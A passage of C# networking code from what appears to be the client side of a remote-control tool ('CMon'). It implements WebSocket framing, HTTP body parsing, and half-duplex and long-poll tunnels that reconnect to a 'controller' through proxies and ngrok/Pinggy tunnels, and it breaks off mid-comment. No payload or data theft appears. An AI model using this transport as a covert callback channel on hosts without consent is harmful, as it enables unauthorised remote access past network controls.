        try { _socket?.Shutdown(SocketShutdown.Both); } catch { }
        try { _incoming.Complete(); } catch { }
    }

    private byte[] MakeFrame(byte[] payload, int opcode)
    {
        if (payload.Length > Cfg.MaxMsg) throw new IOException("WebSocket frame is too large");
        var length = payload.Length;
        var headerLen = length < 126 ? 2 : length < 65536 ? 4 : 10;
        var maskLen = _serverSide ? 0 : 4;
        var frame = new byte[headerLen + maskLen + length];
        frame[0] = (byte)(0x80 | (opcode & 0x0f));
        var maskBit = _serverSide ? 0 : 0x80;
        if (length < 126) frame[1] = (byte)(maskBit | length);
        else if (length < 65536)
        {
            frame[1] = (byte)(maskBit | 126);
            frame[2] = (byte)(length >> 8);
            frame[3] = (byte)length;
        }
        else
        {
            frame[1] = (byte)(maskBit | 127);
            var len = (ulong)length;
            for (var i = 0; i < 8; i++) frame[2 + i] = (byte)(len >> (56 - i * 8));
        }
        if (!_serverSide)
        {
            var mask = RandomNumberGenerator.GetBytes(4);
            Buffer.BlockCopy(mask, 0, frame, headerLen, 4);
            var start = headerLen + 4;
            for (var i = 0; i < length; i++)
                frame[start + i] = (byte)(payload[i] ^ mask[i & 3]);
        }
        else Buffer.BlockCopy(payload, 0, frame, headerLen, length);
        return frame;
    }

    private void RawSend(byte[] data)
    {
        var lastProgress = Now();
        var offset = 0;
        while (offset < data.Length)
        {
            try
            {
                _raw.Write(data, offset, data.Length - offset);
                offset = data.Length;
            }
            catch (IOException ex) when (HttpWire.IsTimeout(ex))
            {
                if (Now() - lastProgress > Cfg.HttpSendStallTimeout)
                    throw new IOException("WebSocket send stalled");
                Thread.Sleep(20);
            }
        }
    }

    private void SendControl(int opcode, byte[] payload)
    {
        lock (_sendLock)
        {
            if (_closed) return;
            try { RawSend(MakeFrame(payload, opcode)); }
            catch (IOException) { Broken(); }
        }
    }

    private byte[] RawRead(int count)
    {
        while (true)
        {
            lock (_wireLock)
            {
                if (_wire.Available >= count) return _wire.Take(count);
            }
            var now = Now();
            if (now >= _nextPing)
            {
                _nextPing = now + Cfg.CmonWsPing;
                SendControl(0x9, Encoding.ASCII.GetBytes("cmon"));
            }
            if (now - _lastRx > Cfg.CmonWsDead)
                throw new IOException("WebSocket peer stopped answering");
            try
            {
                var n = _raw.Read(_readBuffer, 0, _readBuffer.Length);
                if (n <= 0) throw new IOException("WebSocket tunnel closed");
                lock (_wireLock) _wire.Append(_readBuffer, n);
                _lastRx = Now();
            }
            catch (IOException ex) when (HttpWire.IsTimeout(ex))
            {
                if (_closed) throw new IOException("WebSocket tunnel closed");
            }
        }
    }

    private (int Opcode, byte[] Payload) ReadFrame()
    {
        var first = RawRead(2);
        var opcode = first[0] & 0x0f;
        var masked = (first[1] & 0x80) != 0;
        long length = first[1] & 0x7f;
        if (length == 126)
        {
            var ext = RawRead(2);
            length = (ext[0] << 8) | ext[1];
        }
        else if (length == 127)
        {
            var ext = RawRead(8);
            ulong value = 0;
            for (var i = 0; i < 8; i++) value = (value << 8) | ext[i];
            length = (long)value;
        }
        if (length < 0 || length > Cfg.MaxMsg) throw new IOException("WebSocket peer sent an oversized frame");
        var trace = (Environment.GetEnvironmentVariable("CMON_TRACE") ?? "").Trim();
        if (trace is "1" or "true" or "yes" or "on")
            Log.Error($"[ws] frame op={opcode} len={length}");
        var mask = masked ? RawRead(4) : Array.Empty<byte>();
        var payload = length > 0 ? RawRead((int)length) : Array.Empty<byte>();
        if (masked)
            for (var i = 0; i < payload.Length; i++) payload[i] ^= mask[i & 3];
        _lastRx = Now();
        return (opcode, payload);
    }

    private void WriteLocal(byte[] data)
    {
        while (!_closed)
        {
            try { _incoming.Enqueue(data, () => _closed); return; }
            catch (IOException) { if (_closed) throw; }
        }
        throw new IOException("WebSocket tunnel closed");
    }

    private void Pump()
    {
        try
        {
            while (!_closed)
            {
                var (opcode, payload) = ReadFrame();
                if (opcode == 0x8)
                {
                    SendControl(0x8, payload.Take(125).ToArray());
                    break;
                }
                if (opcode == 0x9)
                {
                    SendControl(0xa, payload.Take(125).ToArray());
                    continue;
                }
                if (opcode == 0xa) continue;
                if (opcode is 0x0 or 0x1 or 0x2 && payload.Length > 0) WriteLocal(payload);
            }
        }
        catch (Exception ex) when (ex is IOException or ObjectDisposedException or ArgumentException)
        {
        }
        finally { _incoming.Complete(); }
    }
}

/// <summary>HTTP response body reader (chunked, content-length, or close-delimited).</summary>
public sealed class BodyStream
{
    private readonly Stream _sock;
    private byte[] _wire;
    private readonly List<byte> _body = new();
    private readonly bool _chunked;
    private readonly long _length;
    private long _read;
    private bool _eof;

    public BodyStream(Stream sock, Dictionary<string, string> headers, byte[] initial)
    {
        _sock = sock;
        _wire = initial.ToArray();
        var tokens = (headers.GetValueOrDefault("transfer-encoding") ?? "")
            .Split(',', StringSplitOptions.RemoveEmptyEntries).Select(x => x.Trim().ToLowerInvariant()).ToList();
        _chunked = tokens.Count > 0 && tokens[^1] == "chunked";
        if (!_chunked && long.TryParse(headers.GetValueOrDefault("content-length"), out var length))
            _length = length;
        else _length = -1;
    }

    private byte[] Recv(int size = 262144, int? timeoutMs = null)
    {
        if (timeoutMs != null) { try { _sock.ReadTimeout = timeoutMs.Value; } catch { } }
        try { return ReadExactlyOrLess(size); }
        finally { if (timeoutMs != null) { try { _sock.ReadTimeout = Timeout.Infinite; } catch { } } }
    }

    private byte[] ReadExactlyOrLess(int size)
    {
        var buffer = new byte[size];
        var n = _sock.Read(buffer, 0, size);
        if (n <= 0) return Array.Empty<byte>();
        if (n == size) return buffer;
        return buffer.Take(n).ToArray();
    }

    private byte[] Line()
    {
        while (true)
        {
            var idx = -1;
            for (var i = 0; i + 1 < _wire.Length; i++)
                if (_wire[i] == '\r' && _wire[i + 1] == '\n') { idx = i; break; }
            if (idx >= 0)
            {
                var line = _wire.Take(idx).ToArray();
                _wire = _wire.Skip(idx + 2).ToArray();
                return line;
            }
            if (_wire.Length > Cfg.HttpMaxLine) throw new IOException("HTTP body line is too large");
            var chunk = Recv(timeoutMs: (int)(Cfg.CmonWsDead * 1000));
            if (chunk.Length == 0) throw new IOException("HTTP body ended early");
            _wire = _wire.Concat(chunk).ToArray();
        }
    }

    private void NeedWire(int count)
    {
        while (_wire.Length < count)
        {
            var chunk = Recv(timeoutMs: (int)(Cfg.CmonWsDead * 1000));
            if (chunk.Length == 0) throw new IOException("HTTP body ended early");
            _wire = _wire.Concat(chunk).ToArray();
        }
    }

    private bool More()
    {
        if (_eof) return false;
        if (!_chunked)
        {
            if (_length >= 0)
            {
                var want = (int)Math.Min(262144, _length - _read);
                if (want <= 0) { _eof = true; return false; }
                var chunk = Recv(want, (int)(Cfg.CmonWsDead * 1000));
                if (chunk.Length == 0) { _eof = true; return false; }
                _body.AddRange(chunk);
                _read += chunk.Length;
                if (_read >= _length) _eof = true;
                return true;
            }
            var data = Recv(timeoutMs: (int)(Cfg.CmonWsDead * 1000));
            if (data.Length == 0) { _eof = true; return false; }
            _body.AddRange(data);
            return true;
        }
        var line = Line();
        while (line.Length == 0 && !_eof) line = Line();
        var text = Encoding.ASCII.GetString(line);
        var semi = text.IndexOf(';');
        if (semi >= 0) text = text[..semi];
        if (!int.TryParse(text.Trim(), System.Globalization.NumberStyles.HexNumber,
                System.Globalization.CultureInfo.InvariantCulture, out var size))
            throw new IOException("invalid HTTP chunk size");
        if (size < 0 || size > Cfg.HttpMaxChunk) throw new IOException("HTTP chunk is too large");
        if (size == 0)
        {
            while (true)
            {
                var trailer = Line();
                if (trailer.Length == 0) break;
            }
            _eof = true;
            return false;
        }
        NeedWire(size + 2);
        _body.AddRange(_wire.Take(size));
        _wire = _wire.Skip(size).ToArray();
        if (_wire[0] != '\r' || _wire[1] != '\n') throw new IOException("missing HTTP chunk terminator");
        _wire = _wire.Skip(2).ToArray();
        return true;
    }

    public byte[] Read(int count)
    {
        while (_body.Count < count && !_eof)
            if (!More()) break;
        var take = Math.Min(count, _body.Count);
        var data = _body.Take(take).ToArray();
        _body.RemoveRange(0, take);
        return data;
    }

    public byte[] ReadExact(int count)
    {
        var data = Read(count);
        if (data.Length != count) throw new IOException("HTTP body ended early");
        return data;
    }
}

/// <summary>Portable half-duplex adapter: GET /down body plus POST /up batches.</summary>
public sealed class HalfTunnelClient : Conn
{
    private readonly Socket _downSocket;
    private readonly BodyStream _reader;
    private readonly string _sessionId;
    private readonly string _host;
    private readonly int _port;
    private readonly bool _useTls;
    private readonly string _role;
    private readonly string? _token;
    private readonly BlockingByteQueue _incoming = new();
    private readonly BlockingCollection<byte[]> _upQueue = new(128);
    private readonly object _closeLock = new();
    private volatile bool _closed;
    private bool _writeClosed;
    private bool _resourcesClosed;
    private Socket? _upSocket;
    private Stream? _upStream;
    private long _upSeq;

    public HalfTunnelClient(Socket downSocket, BodyStream reader, string sessionId,
        string host, int port, bool useTls, string role = "control", string? token = null)
    {
        _downSocket = downSocket;
        _reader = reader;
        _sessionId = sessionId;
        _host = host;
        _port = port;
        _useTls = useTls;
        _role = role;
        _token = token;
        Name = "half-duplex";
        Log.Info($"[half] connected role={role} sid={sessionId}");
        new Thread(DownLoop) { IsBackground = true, Name = "half-down-client" }.Start();
        new Thread(UpLoop) { IsBackground = true, Name = "half-up-client" }.Start();
    }

    public override bool IsClosed => _closed;
    public override bool WaitReadable(int timeoutMs) => _incoming.WaitReadable(timeoutMs);
    public override int Read(byte[] buffer, int offset, int count, int timeoutMs)
        => _incoming.Read(buffer, offset, count, timeoutMs);

    public override void Write(byte[] buffer, int offset, int count)
    {
        if (count == 0) return;
        if (_closed || _writeClosed) throw new IOException("half-duplex tunnel is closed");
        var copy = new byte[count];
        Buffer.BlockCopy(buffer, offset, copy, 0, count);
        if (!_upQueue.TryAdd(copy, 30000)) throw new IOException("half-duplex send queue is full");
    }

    public override void ShutdownWrite()
    {
        if (_writeClosed) return;
        _writeClosed = true;
        try { _upQueue.TryAdd(Array.Empty<byte>()); } catch { }
    }

    public override void ShutdownBoth()
    {
        ShutdownWrite();
        _incoming.Complete();
    }

    public override void Close()
    {
        lock (_closeLock)
        {
            if (_closed && _resourcesClosed) return;
            _closed = true;
            try { _upQueue.TryAdd(Array.Empty<byte>()); } catch { }
            try { _downSocket.Dispose(); } catch { }
            CloseUpSocket();
            if (_resourcesClosed) return;
            _resourcesClosed = true;
            _incoming.Complete();
        }
    }

    private void CloseUpSocket()
    {
        var stream = _upStream;
        var sock = _upSocket;
        _upStream = null;
        _upSocket = null;
        try { stream?.Dispose(); } catch { }
        try { sock?.Dispose(); } catch { }
    }

    private void OpenUpSocket()
    {
        var sock = NetUtil.ConnectTarget(_host, _port);
        Stream? stream = null;
        try
        {
            NetUtil.TuneSocket(sock);
            stream = new NetworkStream(sock, ownsSocket: false);
            if (_useTls)
            {
                sock.ReceiveTimeout = Cfg.HttpHandshakeTimeout * 1000;
                stream = Tls.WrapClientTls(sock, _host);
            }
            stream.ReadTimeout = Cfg.HalfUpTimeout * 1000;
            stream.WriteTimeout = Cfg.HalfUpTimeout * 1000;
            _upSocket = sock;
            _upStream = stream;
        }
        catch
        {
            try { stream?.Dispose(); } catch { }
            try { sock.Dispose(); } catch { }
            throw;
        }
    }

    private void SendUpOnce(byte[] data, long sequence)
    {
        if (_upSocket == null || _upStream == null) OpenUpSocket();
        var stream = _upStream!;
        var version = HttpWire.EnvDisabled("CMON_FORCE_HTTP10") ? "HTTP/1.0" : "HTTP/1.1";
        var lines = new List<string>
        {
            $"POST /up {version}",
            $"Host: {NetUtil.HostHeader(_host, _port)}",
            "Content-Type: application/octet-stream",
            $"Content-Length: {data.Length}",
            "Connection: keep-alive",
            $"X-CMon-Session: {_sessionId}",
            $"X-CMon-Up-Seq: {sequence}"
        };
        lines.AddRange(TunnelHeaders.Build(_host, _token, _role));
        lines.Add("");
        lines.Add("");
        try
        {
            var head = Encoding.Latin1.GetBytes(string.Join("\r\n", lines));
            var packet = new byte[head.Length + data.Length];
            Buffer.BlockCopy(head, 0, packet, 0, head.Length);
            Buffer.BlockCopy(data, 0, packet, head.Length, data.Length);
            stream.WriteTimeout = Cfg.HalfUpTimeout * 1000;
            stream.Write(packet, 0, packet.Length);
            var (responseHead, extra) = HttpWire.ReadHead(stream, Cfg.HalfUpTimeout * 1000);
            var (code, parts, status) = HttpWire.ParseStatus(responseHead);
            Log.Info($"[half-up] role={_role} seq={sequence} bytes={data.Length} -> HTTP {code}");
            var headers = HttpWire.Headers(parts.Skip(1));
            var length = int.TryParse(headers.GetValueOrDefault("content-length"), out var l) ? l : 0;
            var body = extra.Take(Math.Max(0, length)).ToArray();
            stream.ReadTimeout = Cfg.HalfUpTimeout * 1000;
            while (body.Length < length)
            {
                var buffer = new byte[Math.Min(length - body.Length, 65536)];
                var n = stream.Read(buffer, 0, buffer.Length);
                if (n <= 0) throw new IOException("POST /up response body ended early");
                body = body.Concat(buffer.Take(n)).ToArray();
            }
            var tokens = (headers.GetValueOrDefault("connection") ?? "")
                .Split(',', StringSplitOptions.RemoveEmptyEntries)
                .Select(x => x.Trim().ToLowerInvariant()).ToList();
            if (tokens.Contains("close")
                || (status[0].Equals("HTTP/1.0", StringComparison.OrdinalIgnoreCase)
                    && !tokens.Contains("keep-alive")))
                CloseUpSocket();
            if (code != 200)
                throw new IOException(
                    $"POST /up returned {string.Join(' ', status.Take(2))} " +
                    $"(role={_role}, sid={_sessionId}, seq={sequence})");
        }
        catch
        {
            CloseUpSocket();
            throw;
        }
    }

    private void SendUp(byte[] data)
    {
        var sequence = Interlocked.Increment(ref _upSeq);
        try { SendUpOnce(data, sequence); }
        catch (IOException)
        {
            CloseUpSocket();
            if (_closed) throw;
            SendUpOnce(data, sequence);
        }
    }

    private void DownLoop()
    {
        Log.Info($"[half-down] started role={_role} sid={_sessionId}");
        try
        {
            while (!_closed)
            {
                var kind = _reader.ReadExact(1)[0];
                if (kind == 0x00) continue;
                if (kind == 0x02) break;
                if (kind != 0x01) throw new IOException("bad half-duplex frame");
                var lengthBytes = _reader.ReadExact(4);
                if (BitConverter.IsLittleEndian) Array.Reverse(lengthBytes);
                var length = (int)BitConverter.ToUInt32(lengthBytes, 0);
                if (length < 0 || length > Cfg.MaxMsg) throw new IOException("half-duplex frame is too large");
                var piece = _reader.ReadExact(length);
                Log.Info($"[half-down] frame kind=1 len={length}");
                _incoming.Enqueue(piece, () => _closed);
            }
        }
        catch (Exception ex) when (ex is IOException or ObjectDisposedException or ArgumentException)
        {
            if (!_closed) Log.Error("[half-down] " + ex.Message);
        }
        finally
        {
            Log.Info($"[half-down] ended closed={_closed}");
            _incoming.Complete();
            try { _downSocket.Dispose(); } catch { }
        }
    }

    private void UpLoop()
    {
        Log.Info($"[half-up] started role={_role} sid={_sessionId}");
        try
        {
            while (!_closed)
            {
                if (!_upQueue.TryTake(out var first, 500)) continue;
                if (first.Length == 0) break;
                var batch = new List<byte>(first);
                while (batch.Count < Cfg.HalfUpBatch)
                {
                    if (!_upQueue.TryTake(out var more, 0))
                    {
                        if (batch.Count < 64 * 1024)
                        {
                            Thread.Sleep(5);
                            if (!_upQueue.TryTake(out more, 0)) break;
                        }
                        else break;
                    }
                    if (more.Length == 0) break;
                    batch.AddRange(more);
                }
                if (batch.Count > 0)
                {
                    var started = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
                    SendUp(batch.ToArray());
                    if ((Environment.GetEnvironmentVariable("CMON_TRACE") ?? "").Trim() is "1" or "true" or "yes" or "on")
                        Log.Info($"[half-up] batch={batch.Count} ms={DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() - started}");
                }
            }
        }
        catch (Exception ex) when (ex is IOException or ArgumentException or ObjectDisposedException)
        {
            if (!_closed)
            {
                Log.Error($"[half-up] {ex.Message}");
                try { _downSocket.Shutdown(SocketShutdown.Both); } catch { }
            }
        }
        finally { _incoming.Complete(); }
    }
}

/// <summary>Long-poll adapter for proxies that buffer whole responses.</summary>
public sealed class PollTunnelClient : Conn
{
    public const double PollWait = 8.0;
    public const int PollBatch = 2 * 1024 * 1024;
    public const double PollTimeout = 25.0;

    private readonly string _host;
    private readonly int _port;
    private readonly bool _useTls;
    private readonly string _sessionId;
    private readonly string _role;
    private readonly string? _token;
    private readonly BlockingByteQueue _incoming = new();
    private readonly BlockingCollection<byte[]> _upQueue = new(128);
    private readonly object _closeLock = new();
    private volatile bool _closed;
    private bool _writeClosed;
    private bool _resourcesClosed;
    private bool _closeNotified;
    private readonly byte[] _initial;
    private long _downPos;
    private long _upSeq;

    public PollTunnelClient(string host, int port, bool useTls, string sessionId,
        string role = "control", string? token = null, byte[]? initial = null)
    {
        _host = host;
        _port = port;
        _useTls = useTls;
        _sessionId = sessionId;
        _role = role;
        _token = token;
        _initial = initial ?? Array.Empty<byte>();
        Name = "long-poll";
        new Thread(DownLoop) { IsBackground = true, Name = "poll-down-client" }.Start();
        new Thread(UpLoop) { IsBackground = true, Name = "poll-up-client" }.Start();
    }

    public override bool IsClosed => _closed;
    public override bool WaitReadable(int timeoutMs) => _incoming.WaitReadable(timeoutMs);
    public override int Read(byte[] buffer, int offset, int count, int timeoutMs)
        => _incoming.Read(buffer, offset, count, timeoutMs);

    public override void Write(byte[] buffer, int offset, int count)
    {
        if (count == 0) return;
        if (_closed || _writeClosed) throw new IOException("poll tunnel is closed");
        var copy = new byte[count];
        Buffer.BlockCopy(buffer, offset, copy, 0, count);
        if (!_upQueue.TryAdd(copy, 30000)) throw new IOException("poll send queue is full");
    }

    public override void ShutdownWrite()
    {
        if (_writeClosed) return;
        _writeClosed = true;
        try { _upQueue.TryAdd(Array.Empty<byte>()); } catch { }
    }

    public override void ShutdownBoth()
    {
        ShutdownWrite();
        _incoming.Complete();
    }

    public override void Close()
    {
        lock (_closeLock)
        {
            if (_closed && _resourcesClosed) return;
            _closed = true;
            if (!_closeNotified)
            {
                _closeNotified = true;
                new Thread(NotifyClose) { IsBackground = true, Name = "poll-close" }.Start();
            }
            try { _upQueue.TryAdd(Array.Empty<byte>()); } catch { }
            if (_resourcesClosed) return;
            _resourcesClosed = true;
            _incoming.Complete();
        }
    }

    private string Path(string endpoint, string extra)
    {
        var query = "session=" + Uri.EscapeDataString(_sessionId);
        if (!string.IsNullOrEmpty(extra)) query += "&" + extra;
        return $"/poll/{endpoint}?{query}";
    }

    private void NotifyClose()
    {
        var extra = "close=1&role=" + Uri.EscapeDataString(_role);
        if (!string.IsNullOrEmpty(_token)) extra += "&token=" + Uri.EscapeDataString(_token);
        try
        {
            PollRequest(_host, _port, _useTls, "POST", Path("up", extra),
                Array.Empty<byte>(), 2.0);
        }
        catch { }
    }

    public static (int Code, Dictionary<string, string> Headers, byte[] Body) PollRequest(
        string host, int port, bool useTls, string method, string path,
        byte[]? body = null, double timeout = PollTimeout)
    {
        body ??= Array.Empty<byte>();
        var socket = NetUtil.ConnectTarget(host, port);
        try
        {
            NetUtil.TuneSocket(socket);
            Stream stream = new NetworkStream(socket, ownsSocket: false);
            if (useTls) stream = Tls.WrapClientTls(socket, host);
            var version = HttpWire.EnvDisabled("CMON_FORCE_HTTP10") ? "HTTP/1.0" : "HTTP/1.1";
            var lines = new List<string>
            {
                $"{method} {path} {version}",
                $"Host: {NetUtil.HostHeader(host, port)}",
                "Accept: */*",
                "Content-Type: application/octet-stream",
                $"Content-Length: {body.Length}",
                "Connection: close",
                "Cache-Control: no-store",
                $"User-Agent: {Cfg.CmonUserAgent}",
                "ngrok-skip-browser-warning: 1",
                "X-Pinggy-No-Screen: 1",
                "X-CMon: 1",
                "",
                ""
            };
            var head = Encoding.Latin1.GetBytes(string.Join("\r\n", lines));
            var packet = new byte[head.Length + body.Length];
            Buffer.BlockCopy(head, 0, packet, 0, head.Length);
            Buffer.BlockCopy(body, 0, packet, head.Length, body.Length);
            stream.WriteTimeout = (int)(timeout * 1000);
            stream.ReadTimeout = (int)(timeout * 1000);
            stream.Write(packet, 0, packet.Length);
            var (responseHead, extra) = HttpWire.ReadHead(stream, (int)(timeout * 1000));
            var (code, parts, _) = HttpWire.ParseStatus(responseHead);
            var headers = HttpWire.Headers(parts.Skip(1));
            stream.ReadTimeout = (int)(timeout * 1000);
            if (headers.TryGetValue("content-length", out var lengthText))
            {
                if (!int.TryParse(lengthText, out var length))
                    throw new TransportNotSupportedException("bad poll Content-Length");
                if (length < 0 || length > Cfg.MaxMsg)
                    throw new TransportNotSupportedException("poll response is too large");
                var data = extra.Take(length).ToList();
                while (data.Count < length)
                {
                    var buffer = new byte[Math.Min(length - data.Count, 262144)];
                    var n = stream.Read(buffer, 0, buffer.Length);
                    if (n <= 0) throw new TransportNotSupportedException("poll response ended early");
                    data.AddRange(buffer.Take(n));
                }
                return (code, headers, data.ToArray());
            }
            var streamReader = new BodyStream(stream, headers, extra);
            var all = new List<byte>();
            while (all.Count <= PollBatch * 4)
            {
                var chunk = streamReader.Read(65536);
                if (chunk.Length == 0) break;
                all.AddRange(chunk);
            }
            return (code, headers, all.ToArray());
        }
        finally
        {
            try { socket.Dispose(); } catch { }
        }
    }

    private void DownLoop()
    {
        try
        {
            var pending = _initial;
            if (pending.Length > 0)
            {
                _incoming.Enqueue(pending, () => _closed);
                _downPos += pending.Length;
            }
            while (!_closed)
            {
                var extra = $"ack={_downPos}&wait={(int)PollWait}&role={Uri.EscapeDataString(_role)}";
                if (!string.IsNullOrEmpty(_token)) extra += "&token=" + Uri.EscapeDataString(_token);
                var path = Path("down", extra);
                var (code, headers, body) = PollRequest(_host, _port, _useTls,
                    "GET", path, Array.Empty<byte>(), PollWait + 17);
                if (code != 200)
                {
                    if (code is 404 or 409 or 410) break;
                    throw new IOException($"poll down returned HTTP {code}");
                }
                if (body.Length > 0)
                {
                    _incoming.Enqueue(body, () => _closed);
                    _downPos += body.Length;
                }
                if (headers.ContainsKey("x-cmon-poll-close")) break;
            }
        }
        catch (Exception ex) when (ex is IOException or ArgumentException or ObjectDisposedException)
        {
            if (!_closed) Log.Error($"[poll-down] {ex.Message}");
        }
        finally { _incoming.Complete(); }
    }

    private void UpLoop()
    {
        try
        {
            while (!_closed)
            {
                if (!_upQueue.TryTake(out var first, 500)) continue;
                if (first.Length == 0) break;
                var batch = new List<byte>(first);
                while (batch.Count < PollBatch)
                {
                    if (!_upQueue.TryTake(out var more, 0))
                    {
                        if (batch.Count < 64 * 1024)
                        {
                            Thread.Sleep(5);
                            if (!_upQueue.TryTake(out more, 0)) break;
                        }
                        else break;
                    }
                    if (more.Length == 0) break;
                    batch.AddRange(more);
                }
                if (batch.Count == 0) continue;
                var sequence = Interlocked.Increment(ref _upSeq);
                var path = Path("up", $"seq={sequence}&role={Uri.EscapeDataString(_role)}");
                if (!string.IsNullOrEmpty(_token)) path += "&token=" + Uri.EscapeDataString(_token);
                object? lastError = null;
                for (var attempt = 0; attempt < 3; attempt++)
                {
                    try
                    {
                        var (code, _, _) = PollRequest(_host, _port, _useTls,
                            "POST", path, batch.ToArray(), PollTimeout);
                        if (code == 200) { lastError = null; break; }
                        lastError = $"HTTP {code}";
                        if (code is 403 or 404 or 409 or 410)
                            throw new IOException($"poll upload rejected ({lastError})");
                    }
                    catch (Exception ex) when (ex is IOException or ArgumentException)
                    {
                        lastError = ex;
                    }
                    if (_closed) break;
                    Thread.Sleep(200 * (attempt + 1));
                }
                if (lastError != null)
                {
                    Log.Error($"[!] poll upload stopped: {lastError}");
                    break;
                }
            }
        }
        catch (Exception ex) when (ex is IOException or ArgumentException or ObjectDisposedException)
        {
            if (!_closed) Log.Error($"[!] poll upload stopped: {ex.Message}");
        }
        finally { _incoming.Complete(); }
    }
}

public static class Transports
{
    public sealed record Candidate(string Kind, int Port)
    {
        public bool UsesTls => Kind is "tls" or "wss" or "streams" or "halfs" or "polls";

        public string Label => Kind switch
        {
            "tcp" => "TCP",
            "tls" => "TLS",
            "ws" => "WebSocket over HTTP",
            "wss" => "WebSocket over HTTPS",
            "stream" => "HTTP stream",
            "streams" => "HTTPS stream",
            "half" => "HTTP half-duplex",
            "halfs" => "HTTPS half-duplex",
            "poll" => "HTTP polling",
            "polls" => "HTTPS polling",
            _ => Kind
        };
    }

    private sealed record CacheEntry(string Host, int Port, string Scheme, string Kind, int BestPort);

    private static readonly object CacheLock = new();
    private static CacheEntry? _cache;
    private static int _consecutiveFailures;
    private static bool _lastAttemptHadPortDown;
    private static DateTime _lastSuccessUtc = DateTime.MinValue;

    public static Conn OpenControllerConnection(string host, int port, string scheme = "auto",
        string role = "control", string? token = null)
    {
        var key = new CacheEntry(host.ToLowerInvariant(), port,
            (scheme ?? "auto").ToLowerInvariant(), "", 0);
        var candidates = Candidates(host, port, scheme ?? "auto");
        var previousPortDown = _lastAttemptHadPortDown;
        if (role == "control") _lastAttemptHadPortDown = false;

        // Promote the transport that worked last time.  On reconnect, after
        // the first failed attempt, stay with it until the sixth failure (or
        // until its port itself is down) before doing a full rescan.  This is
        // the same fast-reconnect behavior as the reference dialer and avoids
        // re-probing every slow HTTP fallback on a stable link.
        Candidate? preferred = null;
        var cached = Cached(key);
        if (cached != null)
        {
            preferred = candidates.FirstOrDefault(candidate =>
                candidate.Kind == cached.Kind && candidate.Port == cached.BestPort);
            if (preferred != null)
            {
                candidates.Remove(preferred);
                candidates.Insert(0, preferred);
            }
        }
        if (preferred != null && _consecutiveFailures > 0
            && _consecutiveFailures % 6 != 0 && !previousPortDown
            && DateTime.UtcNow - _lastSuccessUtc < TimeSpan.FromMinutes(10))
        {
            candidates = new List<Candidate> { preferred };
        }

        var errors = new List<string>();
        var downPorts = new HashSet<int>();
        Exception? softFailure = null;
        var stopAfterSoft = false;

        foreach (var candidate in candidates)
        {
            if (downPorts.Contains(candidate.Port)) continue;
            Conn? conn = null;
            try
            {
                conn = OpenCandidate(candidate, host, role, token);
                if (role == "control") RecvHelloAck(conn, Cfg.HelloAckTimeout);
                Remember(key, candidate);
                _consecutiveFailures = 0;
                _lastSuccessUtc = DateTime.UtcNow;
                _lastAttemptHadPortDown = false;
                return conn;
            }
            catch (Exception ex)
            {
                var inner = NetUtil.Unwrap(ex);
                errors.Add($"{candidate.Kind}: {inner.Message}");
                try { conn?.Close(); } catch { }

                // 502/503/504 from a tunnel means the tunnel edge is up but
                // the controller is not listening behind it yet.  Waiting is
                // much faster than trying every other transport.
                if (inner is TransportTunnelNotReadyException)
                {
                    softFailure = inner;
                    stopAfterSoft = true;
                    break;
                }
                if (inner is TransportSoftException)
                {
                    softFailure ??= inner;
                    if (scheme == "tcp" && candidate.Kind == "tcp")
                    {
                        stopAfterSoft = true;
                        break;
                    }
                    continue;
                }
                if (NetUtil.IsHostDown(inner))
                {
                    // Do not repeat a DNS lookup for every protocol/fallback
                    // port when the hostname itself does not resolve.
                    _lastAttemptHadPortDown = true;
                    break;
                }
                if (NetUtil.IsPortDown(inner))
                {
                    // Nothing can work on this host:port, so skip every other
                    // protocol variant aimed at the same port.
                    downPorts.Add(candidate.Port);
                    _lastAttemptHadPortDown = true;
                    continue;
                }
                if (NetUtil.IsSoftClose(inner))
                {
                    softFailure ??= inner;
                    if (scheme == "tcp" && candidate.Kind == "tcp")
                    {
                        stopAfterSoft = true;
                        break;
                    }
                }
                // Any other answer (wrong protocol, TLS certificate mismatch,
                // an unrelated web server) is a normal probe failure.
            }
        }

        if (role == "control") _consecutiveFailures++;
        if (softFailure != null)
            throw new TransportSoftException(softFailure.Message, softFailure);
        if (stopAfterSoft)
            throw new TransportSoftException("tunnel is up but the controller is not ready");
        throw new TransportNotSupportedException(string.Join("; ",
            errors.Count > 0 ? errors : new List<string> { "no transport succeeded" }));
    }

    /// <summary>
    /// Protocol order adapted from the reference dialer.  The old client
    /// grouped HTTP and HTTPS into one family and then probed four adapters
    /// sequentially; a tunnel URL could therefore spend its whole handshake
    /// budget on a transport that was never going to work.  Trying the exact
    /// protocol families in this order removes that delay while keeping every
    /// fallback available.
    /// </summary>
    public static List<Candidate> Candidates(string host, int port, string scheme)
    {
        scheme = (scheme ?? "auto").ToLowerInvariant();
        if (scheme == "auto" && Cfg.ConnectionType is "tcp" or "http" or "https")
            scheme = Cfg.ConnectionType;

        string[] order;
        if (scheme == "tcp")
            order = new[] { "tcp", "tls", "ws", "wss", "stream", "streams", "half", "halfs", "poll", "polls" };
        else if (scheme == "tls")
            order = new[] { "tls", "tcp", "wss", "ws", "streams", "stream", "halfs", "half", "polls", "poll" };
        else if (scheme == "http")
            order = new[] { "ws", "stream", "half", "poll", "wss", "streams", "halfs", "polls", "tcp", "tls" };
        else if (scheme == "https")
            order = new[] { "wss", "streams", "halfs", "polls", "tls", "ws", "stream", "half", "poll", "tcp" };
        else if (port == 443)
            order = new[] { "wss", "streams", "halfs", "polls", "tls", "tcp", "ws", "stream", "half", "poll" };
        else if (port == 80)
            order = new[] { "ws", "stream", "half", "poll", "tcp", "wss", "streams", "halfs", "polls", "tls" };
        else
            order = new[] { "tcp", "tls", "ws", "wss", "stream", "streams", "half", "halfs", "poll", "polls" };

        var list = order.Select(kind => new Candidate(kind, port)).ToList();

        // A bare tunnel hostname has no port in the address the user pasted.
        // The reference tries the other standard web port as a fallback; do
        // the same, but only for the default 443/80 pair.
        if (NetUtil.LooksLikeTunnelHost(host))
        {
            if ((scheme is "https" or "auto") && port == 443)
                AddFallback(list, 80, "ws", "stream", "half", "poll");
            else if ((scheme is "http" or "auto") && port == 80)
                AddFallback(list, 443, "wss", "streams", "halfs", "polls");
        }

        return list
            .Where(candidate => Allowed(candidate.Kind))
            .DistinctBy(candidate => (candidate.Kind, candidate.Port))
            .ToList();
    }

    private static void AddFallback(List<Candidate> list, int port, params string[] kinds)
    {
        foreach (var kind in kinds) list.Add(new Candidate(kind, port));
    }

    /// <summary>
    /// The reference dialer periodically checks whether the slow HTTP-polling
    /// fallback can be replaced by WebSocket.  Probe only the upgrade (do not
